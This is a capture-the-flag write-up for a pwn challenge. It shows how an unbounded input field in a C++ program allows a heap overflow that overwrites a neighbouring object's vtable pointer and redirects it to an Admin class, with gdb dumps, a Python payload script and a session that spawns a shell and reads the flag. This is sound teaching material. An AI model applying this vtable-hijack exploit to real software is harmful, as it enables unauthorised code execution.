## VIRTUAL TABLET [160]

## Solution
There are two classes: `User` and `Admin`. `Admin` inherits from `User`. We can create several `Users`, which will be contiguous in memory. When "logged in" as a user, we can specify an ICAO code that should be four bytes long. However, this length is not enforced and we are able to overflow into other user objects in memory. This will allow us to overwrite the virtual table (V-Table) pointer of a user to point to an `Admin` class table instead of a `User` class. Then, when we call `::spawn_shell()` on our object, we will call `Admin::spawn_shell()` instead of `User::spawn_shell()` and actually spawn a shell.

This is what the objects look like in memory:
```
ameise@STAHLKERN:~/CS2015/pwn/160_VIRTUAL_TABLET$ gdb ./tablet 
Reading symbols from ./tablet...(no debugging symbols found)...done.
(gdb) break *0x0804937E
Breakpoint 1 at 0x804937e
(gdb) run
Starting program: /home/ameise/CS2015/pwn/160_VIRTUAL_TABLET/tablet 
~~~~~~~~~~~~~~~~~~ iTAB, the FUTURE is THERE ~~~~~~~~~~~~~~~~~
|                      Think Interactive!                    |
--------------------------------------------------------------

guest@iTAB$ login
username: aaaa
aaaa@iTAB$ login
username: bbbb
bbbb@iTAB$ switch
Which user do you want to become?
username: aaaa
aaaa@iTAB$ weather

Please enter your ICAO code: AAAA

Breakpoint 1, 0x0804937e in User::weather() ()
1: x/5i $eip
=> 0x804937e <_ZN4User7weatherEv+370>:	cmp    eax,0x4
   0x8049381 <_ZN4User7weatherEv+373>:	seta   al
   0x8049384 <_ZN4User7weatherEv+376>:	test   al,al
   0x8049386 <_ZN4User7weatherEv+378>:	je     0x80493b3 <_ZN4User7weatherEv+423>
   0x8049388 <_ZN4User7weatherEv+380>:	sub    esp,0x8
(gdb) x/1xw $ebp+0x8
0xffffce60:	0x08053290
(gdb) x/32xw 0x08053290
0x8053290:	0x0804a8b0	0x41414141	0x61616100	0x00000000
0x80532a0:	0x00000000	0x00000000	0x00000000	0x00000021
0x80532b0:	0x0804a8b0	0x00000000	0x62626262	0x00000000
0x80532c0:	0x00000000	0x00000000	0x00000000	0x0001fd39
0x80532d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x80532e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x80532f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x8053300:	0x00000000	0x00000000	0x00000000	0x00000000
```

The basic structure is:
```
0-3     V-table pointer      0x0804a8b0
4-7     ICAO code            'AAAA'
8-31    name                 'aaaa' ...
```

We can't overflow the V-table for the current user, but we can overflow into another user to overwrite his V-table pointer and then switch to that user to spawn a shell. These are the basic steps:
```
1) login as (create) user "aaaa"
2) login as (create) user "bbbb"
3) switch to user "aaaa"
4) enter ICAO code for user "aaaa" as "c"*28 + new_vtable_pointer
5) switch to user "bbbb"
6) spawn shell
```

To find out the new V-table pointer:
```
(gdb) info variables User
All variables matching regular expression "User":

Non-debugging symbols:
0x0804a8a8  vtable for User
0x0804a8d8  typeinfo for User
0x0804a8e0  typeinfo name for User
(gdb) info variables Admin
All variables matching regular expression "Admin":

Non-debugging symbols:
0x0804a898  vtable for Admin
0x0804a8b8  typeinfo for Admin
0x0804a8d0  typeinfo name for Admin
```

We can see that `gdb` has identified the V-table functions for `Admin` and `User` as being `0x10` (16) bytes apart. Using this knowledge, we can overwrite the pointer in a user to point to `Admin` functions instead of `User` functions:
```
0x0804a8b0 - 0x10 = 0x0804a8a0
```

Solution:
```Python
payload = ""

def addline(bytes):
  return bytes + '\n'

vtable_address = "\xa0\xa8\x04\x08"

payload += addline("login")
payload += addline("aaaa")
payload += addline("login")
payload += addline("bbbb")
payload += addline("switch")
payload += addline("aaaa")
payload += addline("weather")
payload += addline("P"*28 + vtable_address + "cc")
payload += addline("switch")
payload += addline("bbbb")

fp = open("input","wb")
fp.write(payload)
fp.close()
```

This will get us to the point where a shell can be spawned by typing `spawn`. Running on the server:
```
ameise@shell:/tmp/ameise$ nano tablet_solve.py
ameise@shell:/tmp/ameise$ python tablet_solve.py 
ameise@shell:/tmp/ameise$ cat input -| /home/problems/281ec2c6d34da8aef3b133c8b76eed63/virtual-tablet_8/tablet
~~~~~~~~~~~~~~~~~~ iTAB, the FUTURE is THERE ~~~~~~~~~~~~~~~~~
|                      Think Interactive!                    |
--------------------------------------------------------------

guest@iTAB$ username: aaaa@iTAB$ username: bbbb@iTAB$ Which user do you want to become?
username: aaaa@iTAB$ 
Please enter your ICAO code: BAD ICAO code
PPPPPPPPPPPPPPPPPPPPPPPP��cc@iTAB$ PPPPPPPPPPPPPPPPPPPPPPPP��cc@iTAB$ Which user do you want to become?
username: bbbb@iTAB$ whoami
Name: bbbb (icao: cc) 
bbbb@iTAB$ spawn
pwd
/tmp/ameise
cd /home/problems/281ec2c6d34da8aef3b133c8b76eed63/virtual-tablet_8
ls
flag  tablet
cat flag
1ddcd619F0BBbe4D_all_your_vtables_are_belong_to_us

exit
bbbb@iTAB$ exit
*** Error in `/home/problems/281ec2c6d34da8aef3b133c8b76eed63/virtual-tablet_8/tablet': free(): invalid next size (fast): 0x0804e078 ***
exit
Aborted
```